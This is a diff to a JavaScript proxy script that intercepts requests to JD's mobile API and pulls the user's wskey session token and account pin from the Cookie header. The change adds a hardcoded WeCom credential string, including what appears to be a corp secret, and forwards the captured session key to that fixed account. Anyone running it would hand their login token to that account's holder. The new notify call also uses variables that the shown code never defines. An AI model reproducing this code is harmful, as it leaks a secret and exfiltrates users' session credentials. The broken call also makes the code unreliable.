@@ -17,7 +17,8 @@ hostname = api.m.jd.com
 */
 
 const $ = new Env("wskey")
-const notify = require('./sendNotify');
+let QYWX_AM = 'ww0ee5dad8623779e8,DPaW2SvKM1BoCkUNvTNnFIBu8HqaGB7tXlo_e6sYIdg,ch,1000003';
+const timeout = 15000;
 !(async () => {
     let cookie = $request.headers.Cookie
     let wskey = cookie.match(/(wskey=[^;]*)/)[1]
@@ -42,7 +43,7 @@ const notify = require('./sendNotify');
     console.log('================')
 
     console.log("wskey获取中！")
-    let send = notify.sendNotify(`${pin}`, `${wskey}`);
+    let send = await qywxamNotify(text, desp)
     console.log(send);
     $notify("点击复制wskey", "",`pt_pin=${pin};${wskey};`);
 })()
